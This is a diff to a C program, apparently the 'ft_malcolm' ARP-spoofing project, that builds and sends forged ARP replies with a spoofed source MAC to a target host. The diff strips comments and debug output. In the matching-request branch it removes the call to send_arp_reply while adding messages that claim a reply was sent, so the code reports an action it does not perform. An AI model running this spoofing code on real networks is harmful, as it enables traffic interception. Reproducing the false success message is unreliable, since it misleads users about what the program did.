@@ -187,28 +187,22 @@ int send_arp_reply(t_session *session, t_options *opts) {
   struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
 
   ft_memset(buffer, 0, sizeof(buffer));
-
-  /* 1. Ethernet Header */
   ft_memcpy(eth->h_dest, opts->target_mac, 6); /* Unicast to Target */
   ft_memcpy(eth->h_source, opts->src_mac, 6);  /* Spoofed Source MAC */
   eth->h_proto = htons(ETH_P_ARP);
 
-  /* 2. ARP Reply Header */
   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
   arp->ea_hdr.ar_pro = htons(ETH_P_IP);
   arp->ea_hdr.ar_hln = 6;
   arp->ea_hdr.ar_pln = 4;
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY); /* Opcode 2 = Reply */
 
-  /* Sender Info (Spoofed Identity) */
   ft_memcpy(arp->arp_sha, opts->src_mac, 6);
   ft_memcpy(arp->arp_spa, &opts->src_ip, 4);
 
-  /* Target Info (Victim Identity) */
   ft_memcpy(arp->arp_tha, opts->target_mac, 6);
   ft_memcpy(arp->arp_tpa, &opts->target_ip, 4);
 
-  /* 3. Send over the EXISTING socket */
   if (sendto(session->sockfd, buffer, sizeof(buffer), 0,
              (struct sockaddr *)&session->sll, sizeof(session->sll)) < 0) {
     ft_putstr_fd("[ft_malcolm] sendto() failed.\n", 2);
@@ -264,27 +258,12 @@ int work(t_options opts) {
                   sizeof(expected_target));
         inet_ntop(AF_INET, &opts.src_ip, expected_src, sizeof(expected_src));
 
-        /*
-        printf("--- CAPTURED REQUEST ---\n");
-        printf("Sender IP : %s (Expected Target: %s)\n", captured_spa,
-        expected_target); printf("Target IP : %s (Expected Source: %s)\n",
-        captured_tpa, expected_src); printf("Sender MAC:
-        %02x:%02x:%02x:%02x:%02x:%02x\n", arp->arp_sha[0], arp->arp_sha[1],
-        arp->arp_sha[2], arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
-        printf("Expected MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                opts.target_mac[0], opts.target_mac[1], opts.target_mac[2],
-                opts.target_mac[3], opts.target_mac[4], opts.target_mac[5]);
-        printf("------------------------\n");
-        */
         if (ft_memcmp(arp->arp_spa, &opts.target_ip, 4) == 0 &&
             ft_memcmp(arp->arp_sha, opts.target_mac, 6) == 0 &&
             ft_memcmp(arp->arp_tpa, &opts.src_ip, 4) == 0) {
-          /*
-          printf("Matching ARP request detected! Preparing reply...\n");
-          send_arp_reply(&session, &opts);
-          printf("ARP reply was sent! Exiting right now...\n");
-          */
-          close(session.sockfd);
+            ft_putstr_fd("Sent an ARP reply packet, you may now check the arp table on the target.\n", 1);
+            ft_putstr_fd("Exiting right now...\n", 1);
+            close(session.sockfd);
           return 0;
         }
       }
